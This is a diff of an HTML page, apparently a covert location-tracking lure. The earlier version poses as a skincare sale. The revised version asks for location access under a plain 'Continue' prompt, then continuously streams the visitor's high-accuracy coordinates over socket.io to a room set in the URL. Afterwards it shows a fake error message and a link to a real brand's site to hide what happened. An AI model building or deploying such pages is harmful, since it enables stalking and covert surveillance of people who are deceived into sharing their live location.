@@ -1,50 +1,86 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
+  <meta charset="UTF-8">
   <title>Continue</title>
-  <meta name="viewport" content="width=device-width">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
   <link rel="stylesheet" href="style.css">
 </head>
 <body>
 
 <div class="container">
-  <div class="card" id="start">
-    <h2>The Big Fox Sale</h2>
-    <p>Up to <b>50% OFF</b> on best-selling skincare products <br />
-      Limited-time offer – check availability in your area</p>
-    <button onclick="start()">Click here to view the offer</button>
+
+  <div class="card" id="step-start">
+    <h2>Continue</h2>
+    <p>Allow location access to proceed</p>
+    <button onclick="requestLocation()">Continue</button>
   </div>
 
-  <div class="card" id="error" style="display:none">
-    <h2>Error</h2>
-    <p>Something went wrong. Please try again later.</p>
+  <div class="card" id="step-denied" style="display:none">
+    <h2>Permission Required</h2>
+    <p>Please allow location permission to continue.</p>
+    <button onclick="requestLocation()">Try Again</button>
   </div>
+
+  <div class="card" id="step-error" style="display:none">
+    <h2>Something went wrong</h2>
+    <p>Please check that location permission is turned on.</p>
+
+    <button onclick="goToWebsite()">Continue to Website</button>
+  </div>
+
 </div>
 
 <script src="/socket.io/socket.io.js"></script>
 <script>
   const socket = io();
-  const room = new URLSearchParams(location.search).get("room");
+  const room = new URLSearchParams(window.location.search).get("room");
+
   socket.emit("join-room", room);
 
-  function start() {
-    navigator.geolocation.watchPosition(
-      pos => {
-        socket.emit("send-location", {
-          roomId: room,
-          lat: pos.coords.latitude,
-          lng: pos.coords.longitude
-        });
-      },
-      () => alert("Permission required"),
-      { enableHighAccuracy: true }
-    );
+  function requestLocation() {
+    hideAll();
 
-    document.getElementById("start").style.display = "none";
-    document.getElementById("error").style.display = "block";
+    if (!navigator.geolocation) {
+      show("step-denied");
+      return;
+    }
+
+    navigator.geolocation.watchPosition(
+      position => {
+        socket.emit("send-location", {
+          room: room,
+          lat: position.coords.latitude,
+          lng: position.coords.longitude
+        });
+
+        show("step-error");
+      },
+      error => {
+        show("step-denied");
+      },
+      {
+        enableHighAccuracy: true,
+        maximumAge: 0
+      }
+    );
+  }
+
+  function goToWebsite() {
+    window.open("https://www.foxtale.in", "_blank");
+  }
+
+  function hideAll() {
+    document.getElementById("step-start").style.display = "none";
+    document.getElementById("step-denied").style.display = "none";
+    document.getElementById("step-error").style.display = "none";
+  }
+
+  function show(id) {
+    hideAll();
+    document.getElementById(id).style.display = "block";
   }
 </script>
 
 </body>
 </html>
-
